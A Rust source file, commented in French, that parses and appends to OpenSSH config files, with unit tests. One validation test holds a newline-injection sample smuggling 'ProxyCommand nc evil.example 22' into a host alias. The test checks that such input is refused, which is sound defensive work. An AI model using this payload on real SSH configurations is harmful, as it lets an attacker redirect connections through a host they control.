//! Avash — parseur ~/.ssh/config v0.1, avec serialisation pour le front.

#[cfg(test)]
pub(crate) mod testutil;

pub mod keys;
pub mod sftp;
pub mod ssh;

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SshHost {
    pub alias: String,
    pub hostname: Option<String>,
    pub user: Option<String>,
    pub port: Option<u16>,
    pub identity_file: Option<String>,
    pub proxy_jump: Option<String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

pub fn ssh_config_path() -> std::path::PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| std::path::PathBuf::from("."))
        .join(".ssh/config")
}

pub fn parse_ssh_config() -> anyhow::Result<Vec<SshHost>> {
    let path = ssh_config_path();
    let content = std::fs::read_to_string(&path)
        .map_err(|e| anyhow::anyhow!("Impossible de lire {}: {e}", path.display()))?;
    let base = path.parent().unwrap_or(Path::new(".")).to_path_buf();
    Ok(parse_config_str(&resolve_includes(&content, &base, 0)))
}

/// Profondeur maximale de resolution des `Include`.
///
/// OpenSSH s'arrete a 16 ; on fait de meme. Sans borne, deux fichiers qui
/// s'incluent mutuellement boucleraient indefiniment.
const MAX_INCLUDE_DEPTH: usize = 16;

/// Resout les directives `Include` et rend le contenu aplati.
///
/// Les chemins relatifs sont resolus depuis `~/.ssh`, comme le fait OpenSSH.
/// `~` est developpe. Les motifs (`config.d/*`) sont etendus par ordre
/// alphabetique. Un fichier illisible est ignore en silence : OpenSSH se
/// comporte ainsi, et une configuration partielle vaut mieux qu'aucune.
fn resolve_includes(content: &str, base: &Path, depth: usize) -> String {
    if depth >= MAX_INCLUDE_DEPTH {
        return content.to_string();
    }
    let mut out = String::with_capacity(content.len());
    for raw in content.lines() {
        let line = raw.trim();
        let is_include = line
            .split_once(char::is_whitespace)
            .map(|(k, _)| k.eq_ignore_ascii_case("include"))
            .unwrap_or(false);
        if !is_include {
            out.push_str(raw);
            out.push('\n');
            continue;
        }
        let Some((_, patterns)) = line.split_once(char::is_whitespace) else {
            continue;
        };
        for pattern in patterns.split_whitespace() {
            for path in expand_include(pattern, base) {
                if let Ok(inner) = std::fs::read_to_string(&path) {
                    let parent = path.parent().unwrap_or(base).to_path_buf();
                    out.push_str(&resolve_includes(&inner, &parent, depth + 1));
                    out.push('\n');
                }
            }
        }
    }
    out
}

/// Developpe un motif d'`Include` en liste de fichiers existants.
fn expand_include(pattern: &str, base: &Path) -> Vec<PathBuf> {
    let expanded = if let Some(rest) = pattern.strip_prefix("~/") {
        dirs::home_dir()
            .unwrap_or_else(|| base.to_path_buf())
            .join(rest)
    } else if pattern.starts_with('/') {
        PathBuf::from(pattern)
    } else {
        base.join(pattern)
    };

    let s = expanded.to_string_lossy().into_owned();
    if !s.contains(['*', '?']) {
        return if expanded.is_file() {
            vec![expanded]
        } else {
            vec![]
        };
    }
    // Motif : on liste le repertoire parent et on filtre a la main plutot
    // que d'ajouter une dependance de glob pour ce seul usage.
    let (dir, pat) = match expanded.parent().zip(expanded.file_name()) {
        Some((d, f)) => (d.to_path_buf(), f.to_string_lossy().into_owned()),
        None => return vec![],
    };
    let Ok(entries) = std::fs::read_dir(&dir) else {
        return vec![];
    };
    let mut found: Vec<PathBuf> = entries
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| p.is_file())
        .filter(|p| {
            p.file_name()
                .map(|n| glob_match(&pat, &n.to_string_lossy()))
                .unwrap_or(false)
        })
        .collect();
    // Ordre stable : OpenSSH lit dans l'ordre lexicographique.
    found.sort();
    found
}

/// Correspondance de motif minimale : `*` et `?`, sans classes.
fn glob_match(pattern: &str, name: &str) -> bool {
    fn inner(p: &[u8], n: &[u8]) -> bool {
        match (p.first(), n.first()) {
            (None, None) => true,
            (Some(b'*'), _) => inner(&p[1..], n) || (!n.is_empty() && inner(p, &n[1..])),
            (Some(b'?'), Some(_)) => inner(&p[1..], &n[1..]),
            (Some(a), Some(b)) if a == b => inner(&p[1..], &n[1..]),
            _ => false,
        }
    }
    inner(pattern.as_bytes(), name.as_bytes())
}

pub fn parse_config_str(content: &str) -> Vec<SshHost> {
    let mut hosts: Vec<SshHost> = Vec::new();
    let mut current: Option<SshHost> = None;

    for raw in content.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (key, value) = match line.split_once(char::is_whitespace) {
            Some((k, v)) => (k.to_lowercase(), v.trim().to_string()),
            None => (line.to_lowercase(), String::new()),
        };

        match key.as_str() {
            "host" => {
                if let Some(h) = current.take() {
                    hosts.push(h);
                }
                current = Some(SshHost {
                    alias: value.to_string(),
                    ..Default::default()
                });
            }
            // Un bloc `Match` ferme le bloc `Host` courant. Sans cela ses
            // directives etaient attribuees au dernier hote rencontre : un
            // `Match exec ...` jamais satisfait pouvait ainsi changer
            // silencieusement l'utilisateur et le port d'un hote reel.
            //
            // Avash n'evalue pas les conditions de `Match` (elles dependent de
            // l'hote cible, de l'utilisateur courant, voire d'une commande) :
            // on ferme le bloc et on ignore ce qu'il contient, plutot que de
            // l'appliquer a tort.
            "match" => {
                if let Some(h) = current.take() {
                    hosts.push(h);
                }
                current = None;
            }
            _ => {
                if let Some(h) = current.as_mut() {
                    match key.as_str() {
                        "hostname" => h.hostname = Some(value),
                        "user" => h.user = Some(value),
                        "port" => h.port = value.parse().ok(),
                        "identityfile" => h.identity_file = Some(value),
                        "proxyjump" => h.proxy_jump = Some(value),
                        _ => {}
                    }
                }
            }
        }
    }
    if let Some(h) = current.take() {
        hosts.push(h);
    }

    let mut expanded = Vec::new();
    for h in hosts {
        for alias in h.alias.split_whitespace() {
            expanded.push(SshHost {
                alias: alias.to_string(),
                ..h.clone()
            });
        }
    }
    expanded.retain(|h| !h.alias.contains('*') && !h.alias.starts_with('!'));
    expanded
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_basic_config() {
        let cfg = r#"
# commentaire
Host web
    HostName 10.0.0.5
    User adrien
    Port 2222
    IdentityFile ~/.ssh/id_ed25519

Host db bastion
    HostName 10.0.0.9
    User root
"#;
        let hosts = parse_config_str(cfg);
        assert_eq!(hosts.len(), 3);
        assert_eq!(hosts[0].alias, "web");
        assert_eq!(hosts[0].port, Some(2222));
        assert_eq!(hosts[1].alias, "db");
        assert_eq!(hosts[2].alias, "bastion");
        assert_eq!(hosts[2].user, Some("root".into()));
    }

    #[test]
    fn skips_wildcards() {
        let cfg = "Host db*\n  User admin\nHost prod-1\n  User root";
        let hosts = parse_config_str(cfg);
        assert_eq!(hosts.len(), 1);
        assert_eq!(hosts[0].alias, "prod-1");
    }
}

/// Ajoute un hote a `~/.ssh/config`.
///
/// On ecrit dans le fichier standard plutot que dans un format propre a
/// Avash : l'hote enregistre devient utilisable avec `ssh`, `scp`, `rsync`
/// et tout l'ecosysteme, pas seulement ici.
///
/// ⚠️ Aucun mot de passe n'est enregistre — ce fichier est en clair. Pour se
/// passer de saisie, la voie propre est de deployer une cle.
pub fn append_host(host: &SshHost) -> anyhow::Result<()> {
    let alias = host.alias.trim();
    validate_alias(alias)?;

    let path = ssh_config_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| anyhow::anyhow!("Création de {} : {e}", parent.display()))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(parent, std::fs::Permissions::from_mode(0o700));
        }
    }

    let existing = std::fs::read_to_string(&path).unwrap_or_default();
    if parse_config_str(&existing)
        .iter()
        .any(|h| h.alias.eq_ignore_ascii_case(alias))
    {
        return Err(anyhow::anyhow!(
            "Un hôte « {alias} » existe déjà dans {}.",
            path.display()
        ));
    }

    let mut block = String::new();
    // Une ligne vide avant le bloc, sauf si le fichier est vide ou en finit
    // deja par une : sinon le `Host` se colle a la directive precedente et
    // en devient une sous-directive.
    if !existing.is_empty() && !existing.ends_with("\n\n") {
        if !existing.ends_with('\n') {
            block.push('\n');
        }
        block.push('\n');
    }
    block.push_str(&render_host_block(host));

    use std::io::Write;
    let mut f = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .map_err(|e| anyhow::anyhow!("Ouverture de {} : {e}", path.display()))?;
    f.write_all(block.as_bytes())
        .map_err(|e| anyhow::anyhow!("Écriture dans {} : {e}", path.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
    }
    Ok(())
}

/// Rend un bloc `Host` au format OpenSSH.
pub fn render_host_block(host: &SshHost) -> String {
    let mut out = format!("Host {}\n", host.alias.trim());
    if let Some(v) = host.hostname.as_deref().filter(|v| !v.trim().is_empty()) {
        out.push_str(&format!("    HostName {}\n", v.trim()));
    }
    if let Some(v) = host.user.as_deref().filter(|v| !v.trim().is_empty()) {
        out.push_str(&format!("    User {}\n", v.trim()));
    }
    if let Some(p) = host.port.filter(|p| *p != 22) {
        out.push_str(&format!("    Port {p}\n"));
    }
    if let Some(v) = host
        .identity_file
        .as_deref()
        .filter(|v| !v.trim().is_empty())
    {
        out.push_str(&format!("    IdentityFile {}\n", v.trim()));
    }
    out
}

/// Un alias finit dans un fichier de configuration lu par OpenSSH.
fn validate_alias(alias: &str) -> anyhow::Result<()> {
    if alias.is_empty() {
        return Err(anyhow::anyhow!("Le nom de l'hôte est vide."));
    }
    // Un saut de ligne permettrait d'injecter n'importe quelle directive
    // dans la configuration SSH — y compris ProxyCommand.
    if alias.contains(['\n', '\r', '\0']) {
        return Err(anyhow::anyhow!("Nom d'hôte invalide : caractère interdit."));
    }
    if alias.contains(char::is_whitespace) {
        return Err(anyhow::anyhow!(
            "Le nom d'hôte ne doit pas contenir d'espace : « {alias} »"
        ));
    }
    // `Host *` s'appliquerait a toutes les connexions.
    if alias.contains(['*', '?', '!']) {
        return Err(anyhow::anyhow!(
            "Le nom d'hôte ne doit pas contenir de joker (* ? !)."
        ));
    }
    Ok(())
}

#[cfg(test)]
mod save_tests {
    use super::*;

    fn host(alias: &str) -> SshHost {
        SshHost {
            alias: alias.into(),
            hostname: Some("10.0.0.7".into()),
            user: Some("adrien".into()),
            port: Some(2222),
            identity_file: Some("/home/a/.ssh/id_ed25519".into()),
            ..Default::default()
        }
    }

    #[test]
    fn le_bloc_rendu_est_relu_a_l_identique() {
        // Boucle complete : ce qu'on ecrit doit etre relisible par le parseur.
        let h = host("prod");
        let relu = parse_config_str(&render_host_block(&h));
        assert_eq!(relu.len(), 1);
        assert_eq!(relu[0].alias, "prod");
        assert_eq!(relu[0].hostname.as_deref(), Some("10.0.0.7"));
        assert_eq!(relu[0].user.as_deref(), Some("adrien"));
        assert_eq!(relu[0].port, Some(2222));
        assert_eq!(
            relu[0].identity_file.as_deref(),
            Some("/home/a/.ssh/id_ed25519")
        );
    }

    #[test]
    fn le_port_par_defaut_n_est_pas_ecrit() {
        // Ecrire « Port 22 » partout alourdit le fichier pour rien.
        let mut h = host("simple");
        h.port = Some(22);
        assert!(
            !render_host_block(&h).contains("Port"),
            "{}",
            render_host_block(&h)
        );
    }

    #[test]
    fn les_champs_vides_sont_omis() {
        let h = SshHost {
            alias: "minimal".into(),
            hostname: Some("  ".into()),
            user: None,
            ..Default::default()
        };
        let bloc = render_host_block(&h);
        assert_eq!(bloc.trim(), "Host minimal", "bloc : {bloc:?}");
    }

    #[test]
    fn un_alias_avec_saut_de_ligne_est_refuse() {
        // Sans ce garde-fou on injecte n'importe quelle directive dans la
        // configuration SSH — ProxyCommand comprise.
        for mechant in [
            "prod\n    ProxyCommand nc evil.example 22",
            "prod\rHost *",
            "prod\0",
        ] {
            assert!(
                validate_alias(mechant).is_err(),
                "devrait etre refuse : {mechant:?}"
            );
        }
    }

    #[test]
    fn un_alias_joker_est_refuse() {
        // « Host * » s'appliquerait a TOUTES les connexions de la machine.
        for mechant in ["*", "prod*", "?", "!prod"] {
            assert!(
                validate_alias(mechant).is_err(),
                "devrait etre refuse : {mechant}"
            );
        }
    }

    #[test]
    fn un_alias_avec_espace_ou_vide_est_refuse() {
        assert!(validate_alias("").is_err());
        assert!(validate_alias("mon serveur").is_err());
    }

    #[test]
    fn un_alias_normal_passe() {
        for bon in ["prod", "prod-web", "serveur_1", "10.0.0.5"] {
            assert!(validate_alias(bon).is_ok(), "devrait passer : {bon}");
        }
    }
    // ---------- Ecriture reelle dans ~/.ssh/config ----------

    use crate::testutil::temp_home;

    #[test]
    fn append_host_cree_le_fichier_et_le_relit() {
        let _h = temp_home();
        append_host(&host("neuf")).unwrap();
        let relu = parse_ssh_config().unwrap();
        assert_eq!(relu.len(), 1);
        assert_eq!(relu[0].alias, "neuf");
    }

    #[test]
    fn append_host_preserve_le_contenu_existant() {
        // Le risque majeur : abimer une configuration que l'utilisateur a
        // ecrite a la main, commentaires compris.
        let _h = temp_home();
        let path = ssh_config_path();
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        let avant = "# Ma config perso\nHost ancien\n    HostName 1.2.3.4\n";
        std::fs::write(&path, avant).unwrap();

        append_host(&host("nouveau")).unwrap();

        let apres = std::fs::read_to_string(&path).unwrap();
        assert!(
            apres.starts_with(avant),
            "le contenu d'origine doit rester intact :\n{apres}"
        );
        assert!(apres.contains("# Ma config perso"), "commentaire perdu");

        let relu = parse_ssh_config().unwrap();
        let noms: Vec<_> = relu.iter().map(|h| h.alias.as_str()).collect();
        assert_eq!(noms, vec!["ancien", "nouveau"]);
    }

    #[test]
    fn append_host_separe_les_blocs_par_une_ligne_vide() {
        // Sans separation, `Host` se colle a la directive precedente et en
        // devient une sous-directive : le nouvel hote serait invisible.
        let _h = temp_home();
        let path = ssh_config_path();
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, "Host a\n    HostName 1.1.1.1").unwrap(); // sans \n final
        append_host(&host("b")).unwrap();
        assert_eq!(parse_ssh_config().unwrap().len(), 2);
    }

    #[test]
    fn append_host_refuse_un_alias_deja_present() {
        let _h = temp_home();
        append_host(&host("double")).unwrap();
        let e = append_host(&host("double")).unwrap_err().to_string();
        assert!(e.contains("existe déjà"), "{e}");
        // Insensible a la casse : OpenSSH l'est aussi.
        let mut autre = host("DOUBLE");
        autre.alias = "DOUBLE".into();
        assert!(append_host(&autre).is_err());
    }

    #[cfg(unix)]
    #[test]
    fn append_host_pose_les_droits_attendus() {
        use std::os::unix::fs::PermissionsExt;
        let _h = temp_home();
        append_host(&host("droits")).unwrap();
        let path = ssh_config_path();
        let m = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(m, 0o600, "config SSH lisible par d'autres");
        let d = std::fs::metadata(path.parent().unwrap())
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(d, 0o700, "~/.ssh trop ouvert");
    }

    // ---------- Match ----------

    #[test]
    fn un_bloc_match_ne_contamine_pas_l_hote_precedent() {
        // Regression : `Match` n'etait pas reconnu comme delimiteur, donc ses
        // directives etaient appliquees au dernier Host. Un `Match exec`
        // jamais satisfait pouvait ainsi changer l'utilisateur et le port
        // d'un hote reel — sans le moindre avertissement.
        let cfg = "Host prod\n  HostName 10.0.0.1\n  User root\n\n                   Match exec \"test -f /tmp/jamais\"\n  User compromis\n  Port 9999\n";
        let hosts = parse_config_str(cfg);
        assert_eq!(hosts.len(), 1, "seul `prod` est un hote : {hosts:?}");
        assert_eq!(
            hosts[0].user.as_deref(),
            Some("root"),
            "utilisateur contamine"
        );
        assert_eq!(hosts[0].port, None, "port contamine");
    }

    #[test]
    fn un_host_apres_un_match_est_bien_lu() {
        let cfg = "Match user root\n  ForwardAgent yes\n\nHost apres\n  HostName 1.2.3.4\n";
        let hosts = parse_config_str(cfg);
        assert_eq!(hosts.len(), 1);
        assert_eq!(hosts[0].alias, "apres");
        assert_eq!(hosts[0].hostname.as_deref(), Some("1.2.3.4"));
    }

    // ---------- Include ----------

    #[test]
    fn include_absolu_est_resolu() {
        let _h = crate::testutil::temp_home();
        let dir = ssh_config_path().parent().unwrap().to_path_buf();
        std::fs::create_dir_all(&dir).unwrap();
        let inc = dir.join("perso");
        std::fs::write(&inc, "Host inclus\n  HostName 5.5.5.5\n").unwrap();
        std::fs::write(
            ssh_config_path(),
            format!(
                "Host principal\n  HostName 1.1.1.1\n\nInclude {}\n",
                inc.display()
            ),
        )
        .unwrap();

        let noms: Vec<_> = parse_ssh_config()
            .unwrap()
            .into_iter()
            .map(|h| h.alias)
            .collect();
        assert!(noms.contains(&"principal".to_string()), "{noms:?}");
        assert!(
            noms.contains(&"inclus".to_string()),
            "l'hote inclus doit apparaitre : {noms:?}"
        );
    }

    #[test]
    fn include_relatif_part_de_ssh() {
        // OpenSSH resout les chemins relatifs depuis ~/.ssh.
        let _h = crate::testutil::temp_home();
        let dir = ssh_config_path().parent().unwrap().to_path_buf();
        std::fs::create_dir_all(dir.join("config.d")).unwrap();
        std::fs::write(
            dir.join("config.d/dix"),
            "Host relatif\n  HostName 9.9.9.9\n",
        )
        .unwrap();
        std::fs::write(ssh_config_path(), "Include config.d/dix\n").unwrap();

        let noms: Vec<_> = parse_ssh_config()
            .unwrap()
            .into_iter()
            .map(|h| h.alias)
            .collect();
        assert_eq!(noms, vec!["relatif"], "{noms:?}");
    }

    #[test]
    fn include_avec_motif_prend_tous_les_fichiers_en_ordre() {
        let _h = crate::testutil::temp_home();
        let dir = ssh_config_path().parent().unwrap().to_path_buf();
        std::fs::create_dir_all(dir.join("config.d")).unwrap();
        std::fs::write(dir.join("config.d/10-a"), "Host aaa\n  HostName 1.1.1.1\n").unwrap();
        std::fs::write(dir.join("config.d/20-b"), "Host bbb\n  HostName 2.2.2.2\n").unwrap();
        std::fs::write(ssh_config_path(), "Include config.d/*\n").unwrap();

        let noms: Vec<_> = parse_ssh_config()
            .unwrap()
            .into_iter()
            .map(|h| h.alias)
            .collect();
        assert_eq!(
            noms,
            vec!["aaa", "bbb"],
            "ordre lexicographique attendu : {noms:?}"
        );
    }

    #[test]
    fn include_manquant_est_ignore_sans_planter() {
        // OpenSSH tolere un Include qui ne correspond a rien ; une config
        // partielle vaut mieux qu'aucune.
        let _h = crate::testutil::temp_home();
        let dir = ssh_config_path().parent().unwrap().to_path_buf();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            ssh_config_path(),
            "Include /rien/du/tout\nHost seul\n  HostName 1.1.1.1\n",
        )
        .unwrap();
        let noms: Vec<_> = parse_ssh_config()
            .unwrap()
            .into_iter()
            .map(|h| h.alias)
            .collect();
        assert_eq!(noms, vec!["seul"], "{noms:?}");
    }

    #[test]
    fn include_circulaire_ne_boucle_pas() {
        // Deux fichiers qui s'incluent mutuellement : borne a 16 niveaux,
        // comme OpenSSH. Sans borne, le parseur ne rendrait jamais la main.
        let _h = crate::testutil::temp_home();
        let dir = ssh_config_path().parent().unwrap().to_path_buf();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("boucle"),
            "Include config\nHost cycle\n  HostName 3.3.3.3\n",
        )
        .unwrap();
        std::fs::write(ssh_config_path(), "Include boucle\n").unwrap();
        let hosts = parse_ssh_config().unwrap();
        assert!(hosts.iter().any(|h| h.alias == "cycle"), "{hosts:?}");
    }

    #[test]
    fn glob_match_gere_etoile_et_point_interrogation() {
        assert!(glob_match("*", "quoi-que-ce-soit"));
        assert!(glob_match("10-*", "10-web"));
        assert!(glob_match("*.conf", "prod.conf"));
        assert!(glob_match("config?", "config1"));
        assert!(!glob_match("config?", "config12"));
        assert!(!glob_match("10-*", "20-web"));
        assert!(glob_match("a*b*c", "axxbyyc"));
    }
}
